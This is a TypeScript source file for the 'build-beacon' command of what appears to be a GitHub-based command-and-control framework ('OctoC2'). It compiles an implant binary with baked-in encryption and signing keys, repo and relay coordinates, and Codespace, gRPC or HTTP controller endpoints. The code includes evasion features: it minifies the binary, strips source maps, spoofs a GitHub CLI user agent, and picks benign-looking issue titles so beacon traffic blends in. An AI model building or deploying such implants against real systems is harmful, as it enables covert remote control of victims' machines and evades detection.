/**
 * octoctl build-beacon
 *
 * Compiles the implant binary with a baked-in X25519 keypair and beacon ID.
 *
 * Usage:
 *   octoctl build-beacon --outfile <path>
 *                        [--beacon-id <uuid>]
 *                        [--source <path>]
 *                        [--relay <account/repo>] (repeatable)
 *                        [--target <bun-target>]
 *
 * Baked compile-time defines:
 *   process.env.OCTOC2_BEACON_ID
 *   process.env.OCTOC2_BEACON_PUBKEY
 *   process.env.OCTOC2_BEACON_SECKEY
 *   process.env.OCTOC2_REPO_OWNER
 *   process.env.OCTOC2_REPO_NAME
 *   process.env.OCTOC2_RELAY_CONSORTIUM  (JSON array, only if --relay used)
 *   process.env.SVC_HTTP_URL             (only if --http-url used)
 *   process.env.OCTOC2_RECOVERY_*         (public bootstrap values, when configured)
 */

import path from "path";
import { hostname as osHostname } from "os";
import { mkdir, writeFile } from "node:fs/promises";
import { generateOperatorKeyPair, bytesToBase64 } from "../lib/crypto.ts";
import { loadTitleTemplates, pickIssueTitle, TitleContext } from "../lib/titleTemplates.ts";
import {
  decodeBase64Url,
  ed25519KeyId,
  encodeBase64Url,
  generateEd25519KeyPair,
} from "@octoc2/shared";
import { normalizeHttpsControllerUrl } from "../lib/controllerUrl.ts";

export interface RelayEntry {
  account: string;
  repo: string;
}

export interface BuildBeaconDefinesInput {
  beaconId: string;
  publicKeyB64: string;
  secretKeyB64: string;
  signingPublicKeyB64: string;
  signingSecretKeyB64: string;
  signingKeyId: string;
  owner: string;
  repo: string;
  relayConsortium: RelayEntry[];
  issueTitle?: string;
  recoveryBootstrap?: {
    owner: string;
    repo: string;
    ref: string;
    signingPublicKey: string;
    signingKeyId: string;
  };
  /** Non-secret Codespace name to bake in (SVC_GRPC_CODESPACE_NAME). */
  codespaceName?: string;
  /** GitHub username for Codespace SSH auth (SVC_GITHUB_USER). */
  githubUser?: string;
  /** Tentacle priority to bake in (SVC_TENTACLE_PRIORITY). e.g. "codespaces,issues" */
  tentaclePriority?: string;
  /** Direct TLS gRPC endpoint whose hostname matches the server certificate SAN. */
  grpcUrl?: string;
  /** Base HTTP URL to bake in (SVC_HTTP_URL). e.g. "https://codespace-8080.app.github.dev" */
  httpUrl?: string;
}

/** Pure helper — exported for unit testing */
export function buildBeaconDefines(input: BuildBeaconDefinesInput): Record<string, string> {
  const defines: Record<string, string> = {
    "process.env.OCTOC2_BEACON_ID": input.beaconId,
    "process.env.OCTOC2_BEACON_PUBKEY": input.publicKeyB64,
    "process.env.OCTOC2_BEACON_SECKEY": input.secretKeyB64,
    "process.env.OCTOC2_BEACON_SIGN_PUBKEY": input.signingPublicKeyB64,
    "process.env.OCTOC2_BEACON_SIGN_SECKEY": input.signingSecretKeyB64,
    "process.env.OCTOC2_BEACON_SIGN_KEY_ID": input.signingKeyId,
    "process.env.OCTOC2_REPO_OWNER": input.owner,
    "process.env.OCTOC2_REPO_NAME": input.repo,
    "process.env.OCTOC2_USER_AGENT": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
  };
  if (input.relayConsortium.length > 0) {
    defines["process.env.OCTOC2_RELAY_CONSORTIUM"] = JSON.stringify(
      input.relayConsortium
    );
  }
  if (input.issueTitle !== undefined) {
    defines["process.env.SVC_ISSUE_TITLE"] = input.issueTitle;
  }
  // Codespace SSH tunnel — all three are non-secret runtime config.
  if (input.codespaceName !== undefined) {
    defines["process.env.SVC_GRPC_CODESPACE_NAME"] = input.codespaceName;
  }
  if (input.githubUser !== undefined) {
    defines["process.env.SVC_GITHUB_USER"] = input.githubUser;
  }
  if (input.tentaclePriority !== undefined) {
    defines["process.env.SVC_TENTACLE_PRIORITY"] = input.tentaclePriority;
  }
  // Public gRPC URL — beacon connects via TLS gRPC without SSH tunnel.
  if (input.grpcUrl !== undefined) {
    defines["process.env.SVC_GRPC_DIRECT"] = input.grpcUrl;
  }
  if (input.httpUrl !== undefined) {
    defines["process.env.SVC_HTTP_URL"] = normalizeHttpsControllerUrl(
      input.httpUrl,
      "--http-url",
    );
  }
  if (input.recoveryBootstrap !== undefined) {
    defines["process.env.OCTOC2_RECOVERY_REPO_OWNER"] =
      input.recoveryBootstrap.owner;
    defines["process.env.OCTOC2_RECOVERY_REPO_NAME"] =
      input.recoveryBootstrap.repo;
    defines["process.env.OCTOC2_RECOVERY_REPO_REF"] =
      input.recoveryBootstrap.ref;
    defines["process.env.OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY"] =
      input.recoveryBootstrap.signingPublicKey;
    defines["process.env.OCTOC2_RECOVERY_SIGNING_KEY_ID"] =
      input.recoveryBootstrap.signingKeyId;
  }
  return defines;
}

export interface BuildBeaconOptions {
  outfile: string;
  beaconId?: string;
  source?: string;
  relay: string[];
  target: string;
  /** When true (default), pick a random benign issue title from the template file. */
  randomTitle?: boolean; // undefined treated as true — commander --no-random-title sets false
  /** Non-secret GitHub Codespace name to bake in. */
  codespaceName?: string;
  /** GitHub username for Codespace SSH auth. */
  githubUser?: string;
  /** Tentacle priority to bake in. e.g. "codespaces,issues" */
  tentaclePriority?: string;
  /** Direct TLS gRPC endpoint (SVC_GRPC_DIRECT) with a certificate-valid hostname. */
  grpcUrl?: string;
  /** Base HTTP URL for HttpTentacle (SVC_HTTP_URL). e.g. "https://codespace-8080.app.github.dev" */
  httpUrl?: string;
  /** Public enrollment artifact path (defaults to <outfile>.enrollment.json). */
  enrollmentOutfile?: string;
}

const CANONICAL_BEACON_ID =
  /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;

export function validateBuildBeaconId(value: string): string {
  if (!CANONICAL_BEACON_ID.test(value)) {
    throw new Error("Beacon ID must be a canonical lowercase UUID");
  }
  return value;
}

/** Minimal env resolution for build-beacon — only needs token/owner/repo, no operator secret. */
async function resolveBuildEnv() {
  const owner = process.env["OCTOC2_REPO_OWNER"]?.trim();
  const repo  = process.env["OCTOC2_REPO_NAME"]?.trim();
  const missing: string[] = [];
  if (!owner) missing.push("OCTOC2_REPO_OWNER");
  if (!repo)  missing.push("OCTOC2_REPO_NAME");
  if (missing.length > 0) throw new Error(`Missing required environment variables: ${missing.join(", ")}`);

  const recoveryOwner =
    process.env["OCTOC2_RECOVERY_REPO_OWNER"]?.trim();
  const recoveryRepo =
    process.env["OCTOC2_RECOVERY_REPO_NAME"]?.trim();
  const recoveryRef =
    process.env["OCTOC2_RECOVERY_REPO_REF"]?.trim();
  const recoverySigningPublicKey =
    process.env["OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY"]?.trim();
  const recoverySigningKeyId =
    process.env["OCTOC2_RECOVERY_SIGNING_KEY_ID"]?.trim();
  const recoveryValues = [
    recoveryOwner,
    recoveryRepo,
    recoveryRef,
    recoverySigningPublicKey,
    recoverySigningKeyId,
  ];
  const recoveryProvided = recoveryValues.filter(Boolean).length;
  if (recoveryProvided !== 0 && recoveryProvided !== recoveryValues.length) {
    throw new Error(
      "OCTOC2 recovery repository and signing trust values must all be set",
    );
  }
  if (recoveryProvided === recoveryValues.length) {
    if (
      !/^[A-Za-z0-9_.-]+$/.test(recoveryOwner!) ||
      !/^[A-Za-z0-9_.-]+$/.test(recoveryRepo!) ||
      recoveryRef!.startsWith("/") ||
      recoveryRef!.endsWith("/") ||
      recoveryRef!.includes("..") ||
      recoveryRef!.includes("\\") ||
      !/^[A-Za-z0-9_./-]+$/.test(recoveryRef!)
    ) {
      throw new Error("Recovery repository coordinates/ref are invalid");
    }
    const signingPublicKey = await decodeBase64Url(
      recoverySigningPublicKey!,
    );
    if (
      signingPublicKey.length !== 32 ||
      await ed25519KeyId(signingPublicKey) !== recoverySigningKeyId
    ) {
      throw new Error("Recovery signing public key/key ID are invalid");
    }
  }

  return {
    owner: owner!,
    repo: repo!,
    ...(recoveryProvided === recoveryValues.length && {
      recoveryBootstrap: {
        owner: recoveryOwner!,
        repo: recoveryRepo!,
        ref: recoveryRef!,
        signingPublicKey: recoverySigningPublicKey!,
        signingKeyId: recoverySigningKeyId!,
      },
    }),
  };
}

export async function runBuildBeacon(opts: BuildBeaconOptions): Promise<void> {
  const env = await resolveBuildEnv();

  const beaconId = opts.beaconId === undefined
    ? crypto.randomUUID()
    : validateBuildBeaconId(opts.beaconId);
  const kp = await generateOperatorKeyPair();
  const pubB64 = await bytesToBase64(kp.publicKey);
  const secB64 = await bytesToBase64(kp.secretKey);
  const signingKeys = await generateEd25519KeyPair();
  const signingPublicKeyB64 = encodeBase64Url(signingKeys.publicKey);
  const signingSecretKeyB64 = encodeBase64Url(signingKeys.secretKey);
  const signingKeyId = await ed25519KeyId(signingKeys.publicKey);

  // Parse relay entries: each is "account/repo"
  const relayConsortium: RelayEntry[] = opts.relay.map((r) => {
    const [account, repo] = r.split("/");
    if (!account || !repo)
      throw new Error(
        `Invalid relay format: '${r}' — expected account/repo`
      );
    return { account, repo };
  });

  let issueTitle: string | undefined;
  if (opts.randomTitle !== false) {
    const shortId = beaconId.replace(/-/g, "").slice(0, 8);
    const templates = await loadTitleTemplates(
      path.resolve(process.cwd(), "implant/config/title-templates.json")
    );
    const ctx: TitleContext = {
      shortId,
      hostname: osHostname(),
      // Bun ships full ICU; "en-US" locale gives "Mar 30" format on all platforms.
      date: new Date().toLocaleDateString("en-US", { month: "short", day: "numeric" }),
    };
    issueTitle = pickIssueTitle(templates, ctx);
  }

  const defines = buildBeaconDefines({
    beaconId,
    publicKeyB64: pubB64,
    secretKeyB64: secB64,
    signingPublicKeyB64,
    signingSecretKeyB64,
    signingKeyId,
    owner: env.owner,
    repo: env.repo,
    relayConsortium,
    ...(env.recoveryBootstrap !== undefined && {
      recoveryBootstrap: env.recoveryBootstrap,
    }),
    ...(issueTitle            !== undefined && { issueTitle }),
    ...(opts.codespaceName    !== undefined && { codespaceName:   opts.codespaceName }),
    ...(opts.githubUser       !== undefined && { githubUser:      opts.githubUser }),
    ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
    ...(opts.grpcUrl          !== undefined && { grpcUrl:          opts.grpcUrl }),
    ...(opts.httpUrl          !== undefined && { httpUrl:          opts.httpUrl }),
  });

  const source = opts.source ?? "./implant/src/index.ts";
  const defineArgs: string[] = Object.entries(defines).flatMap(([k, v]) => [
    "--define",
    `${k}="${v}"`,
  ]);

  const DIM = "\x1b[2m";
  const BOLD = "\x1b[1m";
  const RESET = "\x1b[0m";
  const GREEN = "\x1b[32m";

  console.log(`\n  Building beacon binary…`);
  console.log(`  ${DIM}Source:${RESET}   ${source}`);
  console.log(`  ${DIM}Target:${RESET}   ${opts.target}`);
  console.log(`  ${DIM}Outfile:${RESET}  ${opts.outfile}`);
  console.log(`  ${DIM}Relays:${RESET}   ${relayConsortium.length} configured`);
  if (issueTitle !== undefined) {
    console.log(`  ${DIM}Issue title:${RESET} ${issueTitle}`);
  }

  // Resolve the bun executable: prefer $BUN_INSTALL/bin or ~/.bun/bin so that
  // the child process can find it even when PATH is stripped (e.g. in CI).
  const bunBin =
    Bun.which("bun") ??
    `${process.env.BUN_INSTALL ?? `${process.env.HOME}/.bun`}/bin/bun`;

  // cpu-features is an optional native addon used by ssh2 (wrapped in try/catch).
  // Bun's bundler cannot resolve the pre-compiled .node binary at build time, so
  // we mark it external to let the try/catch fail gracefully at runtime.
  const proc = Bun.spawn(
    [
      bunBin,
      "build",
      "--compile",
      "--minify",
      "--sourcemap=none",
      '--compile-exec-argv=--smol',
      `--target=${opts.target}`,
      "--external=cpu-features",
      "--external=*/sshcrypto.node",
      ...defineArgs,
      "--outfile",
      opts.outfile,
      source,
    ],
    {
      stdout: "inherit",
      stderr: "inherit",
      env: {
        ...process.env,
        PATH: `${process.env.HOME}/.bun/bin:${process.env.PATH ?? ""}`,
      },
    }
  );
  const code = await proc.exited;

  if (code !== 0) {
    console.error(`\n  Build failed (exit ${code}).\n`);
    process.exit(1);
  }

  const enrollmentOutfile = path.resolve(
    opts.enrollmentOutfile ?? `${opts.outfile}.enrollment.json`,
  );
  await mkdir(path.dirname(enrollmentOutfile), { recursive: true });
  await writeFile(
    enrollmentOutfile,
    JSON.stringify({
      version: 1,
      beaconId,
      encryptionPublicKey: pubB64,
      signingPublicKey: signingPublicKeyB64,
      signingKeyId,
      createdAt: new Date().toISOString(),
    }, null, 2),
    "utf8",
  );

  console.log("");
  console.log(`  ${GREEN}✓${RESET} Beacon binary: ${opts.outfile}`);
  console.log(`  ${DIM}Beacon ID:${RESET}  ${beaconId}`);
  console.log(`  ${DIM}Public key:${RESET} ${pubB64}`);
  console.log(`  ${DIM}Signing key:${RESET} ${signingKeyId}`);
  console.log(`  ${DIM}Enrollment:${RESET} ${enrollmentOutfile}`);
  if (relayConsortium.length > 0) {
    console.log(`  ${DIM}Relay:${RESET}      ${relayConsortium.length} configured`);
  }
  if (opts.grpcUrl !== undefined) {
    console.log(`  ${DIM}gRPC URL:${RESET}   ${opts.grpcUrl} (baked)`);
    console.log(`  ${DIM}Priority:${RESET}   ${opts.tentaclePriority ?? "auto-detect"} (baked)`);
  }
  if (opts.httpUrl !== undefined) {
    console.log(`  ${DIM}HTTP URL:${RESET}   ${opts.httpUrl} (baked)`);
  }
  if (opts.grpcUrl === undefined && opts.codespaceName !== undefined) {
    console.log(`  ${DIM}Codespace:${RESET}  ${opts.codespaceName} (baked)`);
    console.log(`  ${DIM}GH user:${RESET}    ${opts.githubUser ?? "(not set)"} (baked)`);
    console.log(`  ${DIM}Priority:${RESET}   ${opts.tentaclePriority ?? "auto-detect"} (baked)`);
  }
  console.log("");
  console.log(`  ${BOLD}Next:${RESET} import the enrollment artifact into the server before deployment.`);
  console.log("");
}
